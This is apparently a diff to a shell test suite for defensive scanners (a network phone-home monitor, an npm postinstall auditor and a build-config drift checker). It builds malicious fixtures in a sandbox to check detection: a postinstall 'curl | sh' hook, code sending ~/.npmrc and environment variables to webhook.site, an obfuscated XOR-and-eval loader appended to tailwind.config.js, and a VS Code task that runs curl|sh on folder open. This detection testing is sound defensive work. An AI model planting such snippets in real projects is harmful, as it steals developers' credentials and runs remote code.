@@ -263,6 +263,147 @@ else
   echo "  SKIP  --deep behavioural (guarddog/semgrep not installed)"
 fi
 
+# ── phone-home-monitor.ps1 (offline replay + contract) ─────────────────────
+echo "-- phone-home-monitor.ps1 --"
+PHM="$SCRIPTS/phone-home-monitor.ps1"
+if command -v pwsh >/dev/null 2>&1; then
+  PHMW="$PHM"
+  command -v cygpath >/dev/null 2>&1 && PHMW="$(cygpath -w "$PHM")"
+  out="$(pwsh -NoProfile -File "$PHMW" --help 2>&1)"; rc=$?
+  expect_exit "--help" 0 "$rc"
+  expect_has  "--help has Examples" "Examples" "$out"
+  pwsh -NoProfile -File "$PHMW" --bogus >/dev/null 2>&1; expect_exit "bad flag -> 2" 2 $?
+  pwsh -NoProfile -File "$PHMW" -InputJson "$SB/nope.json" >/dev/null 2>&1; expect_exit "missing input -> 3" 3 $?
+  # rules engine, deterministic via replay fixtures
+  cat > "$SB/phm-evil.json" <<'JSONF'
+{"connections":[
+ {"processName":"node.exe","path":"C:\\p\\node_modules\\.bin\\node.exe","pid":1,"parentChain":["npm.cmd"],"remoteAddress":"203.0.113.7","remotePort":443,"remoteHost":null,"signed":"unsigned"},
+ {"processName":"python.exe","path":"C:\\u\\AppData\\Local\\Temp\\python.exe","pid":2,"parentChain":["pip.exe"],"remoteAddress":"198.51.100.9","remotePort":443,"remoteHost":"x.webhook.site","signed":"unknown"}
+]}
+JSONF
+  cat > "$SB/phm-clean.json" <<'JSONF'
+{"connections":[
+ {"processName":"chrome.exe","path":"C:\\Program Files\\Google\\Chrome\\chrome.exe","pid":3,"parentChain":["explorer.exe"],"remoteAddress":"140.82.112.3","remotePort":443,"remoteHost":"github.com","signed":"signed"},
+ {"processName":"node.exe","path":"C:\\Program Files\\nodejs\\node.exe","pid":4,"parentChain":["code.exe"],"remoteAddress":"192.168.1.50","remotePort":3000,"remoteHost":null,"signed":"signed"}
+]}
+JSONF
+  EVIL_W="$SB/phm-evil.json"; CLEAN_W="$SB/phm-clean.json"
+  command -v cygpath >/dev/null 2>&1 && { EVIL_W="$(cygpath -w "$EVIL_W")"; CLEAN_W="$(cygpath -w "$CLEAN_W")"; }
+  out="$(pwsh -NoProfile -File "$PHMW" -InputJson "$EVIL_W" 2>/dev/null)"; rc=$?
+  expect_exit "evil replay -> 10" 10 "$rc"
+  expect_has  "flags package-manager child" "package-manager-child" "$out"
+  expect_has  "flags IOC endpoint (webhook.site)" "ioc-endpoint" "$out"
+  expect_has  "flags node_modules path" "suspicious-path" "$out"
+  pwsh -NoProfile -File "$PHMW" -InputJson "$CLEAN_W" >/dev/null 2>&1
+  expect_exit "clean replay (LAN node dev-server incl.) -> 0" 0 $?
+  out="$(pwsh -NoProfile -File "$PHMW" -InputJson "$EVIL_W" -Json 2>/dev/null)"; rc=$?
+  expect_exit "evil replay --json -> 10" 10 "$rc"
+  expect_has  "json envelope has schema" "phone-home-monitor/v1" "$out"
+  # -Sysmon contract: exit 5 with install hint when Sysmon absent (skip if installed)
+  if pwsh -NoProfile -Command 'try { $null = Get-WinEvent -ListLog "Microsoft-Windows-Sysmon/Operational" -ErrorAction Stop; exit 0 } catch { exit 1 }' >/dev/null 2>&1; then
+    echo "  SKIP  -Sysmon missing-dep check (Sysmon is installed here)"
+  else
+    out="$(pwsh -NoProfile -File "$PHMW" -Sysmon 2>&1)"; rc=$?
+    expect_exit "-Sysmon w/o Sysmon -> 5" 5 "$rc"
+    expect_has  "hint names SwiftOnSecurity config" "SwiftOnSecurity" "$out"
+  fi
+else
+  echo "  SKIP  pwsh not found (Windows-only script)"
+fi
+
+# ── postinstall-audit.py (on-disk behavioural scan, incremental cache) ─────
+echo "-- postinstall-audit.py --"
+PA="$SCRIPTS/postinstall-audit.py"
+"$PYTHON" "$PA" --help >/dev/null 2>&1; expect_exit "--help" 0 $?
+"$PYTHON" "$PA" --bogus >/dev/null 2>&1; expect_exit "bad flag -> 2" 2 $?
+"$PYTHON" "$PA" --root "$SB/nonexistent-root-xyz" >/dev/null 2>&1; expect_exit "missing root -> 3" 3 $?
+
+# malicious npm package: shell lifecycle + cred-read + exfil endpoint + env harvest
+mkdir -p "$SB/pa/node_modules/evil-pkg" "$SB/pa/node_modules/good-pkg"
+printf '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"curl http://1.2.3.4/x | sh"}}' > "$SB/pa/node_modules/evil-pkg/package.json"
+cat > "$SB/pa/node_modules/evil-pkg/index.js" <<'EVIL'
+const c = require('fs').readFileSync(process.env.HOME + '/.npmrc');
+fetch('https://webhook.site/abc', {method:'POST', body: JSON.stringify(process.env)});
+EVIL
+printf '{"name":"good-pkg","version":"2.0.0"}' > "$SB/pa/node_modules/good-pkg/package.json"
+printf 'module.exports = (a,b) => a+b;\n' > "$SB/pa/node_modules/good-pkg/index.js"
+out="$("$PYTHON" "$PA" --root "$SB/pa" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "malicious tree -> 10" 10 "$rc"
+expect_has  "flags lifecycle-shell" "lifecycle-shell" "$out"
+expect_has  "flags cred-exfil" "cred-exfil" "$out"
+expect_has  "flags env-exfil" "env-exfil" "$out"
+expect_has  "names evil-pkg" "evil-pkg@1.0.0" "$out"
+
+# clean tree -> exit 0 (and good-pkg never flagged)
+mkdir -p "$SB/pa-clean/node_modules/lib"
+printf '{"name":"lib","version":"1.0.0"}' > "$SB/pa-clean/node_modules/lib/package.json"
+printf 'export const f = (x) => x * 2;\n' > "$SB/pa-clean/node_modules/lib/index.js"
+"$PYTHON" "$PA" --root "$SB/pa-clean" --no-cache >/dev/null 2>&1
+expect_exit "clean tree -> 0" 0 $?
+
+# false-positive guard: eval+base64 (legit bundler pattern) must NOT fire at default medium
+mkdir -p "$SB/pa-bundler/node_modules/bundler"
+printf '{"name":"bundler","version":"1.0.0"}' > "$SB/pa-bundler/node_modules/bundler/package.json"
+printf 'const v = eval("1+1"); const d = atob("aGk=");\n' > "$SB/pa-bundler/node_modules/bundler/index.js"
+"$PYTHON" "$PA" --root "$SB/pa-bundler" --no-cache >/dev/null 2>&1
+expect_exit "eval+base64 below default medium gate -> 0" 0 $?
+out="$("$PYTHON" "$PA" --root "$SB/pa-bundler" --no-cache --min-severity low 2>/dev/null)"; rc=$?
+expect_exit "eval+base64 visible at --min-severity low -> 10" 10 "$rc"
+expect_has  "low eval-base64 surfaces" "eval-base64" "$out"
+
+# --json envelope shape
+out="$("$PYTHON" "$PA" --root "$SB/pa" --no-cache --json --findings-only 2>/dev/null)"
+expect_has  "json envelope schema" "postinstall-audit/v1" "$out"
+
+# incremental cache: a second run on an unchanged tree is all cache hits
+CACHE="$SB/pa-cache.json"
+"$PYTHON" "$PA" --root "$SB/pa-clean" --cache "$CACHE" >/dev/null 2>&1
+err="$("$PYTHON" "$PA" --root "$SB/pa-clean" --cache "$CACHE" 2>&1 >/dev/null)"
+expect_has  "second run hits cache" "cache hits" "$err"
+
+# ── config-drift-check.py (repo-integrity / config-as-code, layer 6) ───────
+echo "-- config-drift-check.py --"
+CD="$SCRIPTS/config-drift-check.py"
+"$PYTHON" "$CD" --help >/dev/null 2>&1; expect_exit "--help" 0 $?
+"$PYTHON" "$CD" --bogus >/dev/null 2>&1; expect_exit "bad flag -> 2" 2 $?
+"$PYTHON" "$CD" "$SB/no-such-file.config.js" >/dev/null 2>&1; expect_exit "missing file -> 3" 3 $?
+
+# clean build config -> 0 (legit vite config must NOT false-fire)
+mkdir -p "$SB/cd-clean" "$SB/cd-evil/.vscode"
+cat > "$SB/cd-clean/vite.config.js" <<'VITE'
+import { defineConfig } from 'vite'
+import react from '@vitejs/plugin-react'
+export default defineConfig({ plugins: [react()], server: { port: 3000 } })
+VITE
+"$PYTHON" "$CD" --root "$SB/cd-clean" >/dev/null 2>&1
+expect_exit "clean build config -> 0" 0 $?
+
+# poisoned tailwind.config.js: appended blockchain-RPC + XOR + eval loader (PolinRider Stage 2)
+cat > "$SB/cd-evil/tailwind.config.js" <<'TW'
+module.exports = { content: ['./src/**/*.{js,ts}'], theme: { extend: {} } }
+const _0xa1b2 = fetch('https://api.ethplorer.io/getAddressInfo/0xdead?apiKey=freekey').then(r=>r.text()).then(d=>{let s='';for(let i=0;i<d.length;i++)s+=String.fromCharCode(d.charCodeAt(i)^0x42);eval(s);});
+TW
+"$PYTHON" "$CD" --root "$SB/cd-evil" --findings-only >/dev/null 2>&1
+expect_exit "poisoned build config -> 10" 10 $?
+out="$("$PYTHON" "$CD" "$SB/cd-evil/tailwind.config.js" --findings-only 2>&1)"; rc=$?
+expect_exit "poisoned config (by file) -> 10" 10 "$rc"
+expect_has  "names the flagged file" "tailwind.config.js" "$out"
+expect_has  "flags blockchain dead-drop" "blockchain-c2" "$out"
+expect_has  "flags eval/exec" "eval-exec" "$out"
+expect_has  "flags xor decode" "xor-decode" "$out"
+
+# .vscode/tasks.json runOn:folderOpen auto-run shell (PolinRider Stage 1)
+cat > "$SB/cd-evil/.vscode/tasks.json" <<'TJ'
+{ "version": "2.0.0", "tasks": [ { "label": "init", "type": "shell", "command": "curl http://1.2.3.4/x | sh", "runOptions": { "runOn": "folderOpen" } } ] }
+TJ
+out="$("$PYTHON" "$CD" "$SB/cd-evil/.vscode/tasks.json" --findings-only 2>&1)"; rc=$?
+expect_exit "tasks.json folderOpen auto-run -> 10" 10 "$rc"
+expect_has  "flags tasks autorun shell" "tasks-autorun-shell" "$out"
+
+# --json envelope shape
+out="$("$PYTHON" "$CD" --root "$SB/cd-evil" --json --findings-only 2>/dev/null)"
+expect_has  "json envelope schema" "config-drift-check/v1" "$out"
+
 # ── summary ────────────────────────────────────────────────────────────────
 echo "=== $PASS passed, $FAIL failed ==="
 [[ "$FAIL" -eq 0 ]] || exit 1
